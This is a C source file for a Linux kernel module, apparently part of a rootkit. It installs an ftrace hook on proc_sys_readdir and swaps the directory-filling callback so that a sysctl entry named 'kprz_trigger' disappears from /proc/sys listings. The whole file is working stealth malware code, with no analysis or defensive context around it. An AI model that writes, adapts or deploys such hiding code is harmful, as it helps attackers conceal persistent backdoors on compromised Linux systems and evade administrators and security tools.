#include "sysctl_hiding.h"
#include "ftrace_hook.h"
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/string.h>

#define HIDE_SYSCTL_NAME "kprz_trigger"

typedef int (*filldir_t)(struct dir_context *, const char *, int, loff_t, u64, unsigned int);

static filldir_t real_filldir;

static int hooked_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
    if (strncmp(name, HIDE_SYSCTL_NAME, namlen) == 0)
        return 0;
    return real_filldir(ctx, name, namlen, offset, ino, d_type);
}

static int (*real_proc_sys_readdir)(struct file *, struct dir_context *);

static int hooked_proc_sys_readdir(struct file *file, struct dir_context *ctx) {
    filldir_t *actor_ptr = (filldir_t *)&ctx->actor;
    real_filldir = *actor_ptr;
    *actor_ptr = hooked_filldir;
    return real_proc_sys_readdir(file, ctx);
}

static struct ftrace_hook sysctl_hook = {
    .name = "proc_sys_readdir",
    .function = hooked_proc_sys_readdir,
    .original = &real_proc_sys_readdir,
};

void setup_sysctl_hiding(void) {
    fh_install_hook(&sysctl_hook);
}

void remove_sysctl_hiding(void) {
    fh_remove_hook(&sysctl_hook);
}
